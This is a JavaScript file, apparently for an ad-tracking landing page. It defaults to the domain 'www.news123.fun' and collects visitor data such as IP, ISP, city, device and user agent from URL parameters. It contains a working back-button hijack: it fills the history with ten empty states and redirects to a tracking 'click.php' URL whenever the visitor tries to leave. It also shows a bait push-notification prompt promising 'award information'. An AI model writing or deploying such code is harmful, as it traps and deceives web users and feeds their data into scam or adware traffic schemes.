// NEED JQ !!!

function getURLParameter(name) {
    return decodeURI(
        (RegExp(name + '=' + '(.*?)(&|$)').exec(location.search) || [, null])[1] || ''
    );
}

var tk = getURLParameter('tk');// pub.min.js use it too
if(!tk){
    tk = 'www.news123.fun';
}
var trackDomain = "https://"+tk;
console.log('trackDomain:'+trackDomain);

// BACK
var backkey = getURLParameter('backkey');
if (backkey) {
var bburl = trackDomain+'/click.php?key='+backkey;
console.log("bburl:"+bburl);
! function() {
var t;
try {
for(t = 0; 10 > t; ++t) history.pushState({}, "", "");
onpopstate = function(t) {
PreventExitPop = false
t.state && location.replace(bburl)
}
} catch(o) {}
}();
}

// COLLECT PUSH
var userJson = JSON.stringify({
            device_name: getURLParameter('device_name'),
            browser_name: getURLParameter('browser_name'),
            language: getURLParameter('language'),
            city: getURLParameter('city'),
            trafficsource_name: getURLParameter('trafficsource_name'),
            device_brand: getURLParameter('device_brand'),
            device_model: getURLParameter('device_model'),
            browser_version: getURLParameter('browser_version'),
            os_name: getURLParameter('os_name'),
            os_version: getURLParameter('os_version'),
            country: getURLParameter('country'),
            isp: getURLParameter('isp'),
            ip: getURLParameter('ip'),
            user_agent: getURLParameter('user_agent'),
            clickid: getURLParameter('clickid'),
			intent: getURLParameter('intent')
        })

//var pm_allowAction = function () { location.href = ''; };
//var pm_denyAction = function () { location.href = ''; };
var pm_tag = userJson;
//var pm_enablePrompt = true;
var pm_promptText = 'Please allow us to push you the award information.Thank you!';
var pm_promptAcceptBtnText = 'OK';
var pm_promptDenyBtnText = 'NO';
//var pm_promptHideDeny = true;
var pm_pid = "888888888";

// var tk is require
var imported = document.createElement('script');
imported.src = '/js/pub.min.js';
document.head.appendChild(imported);

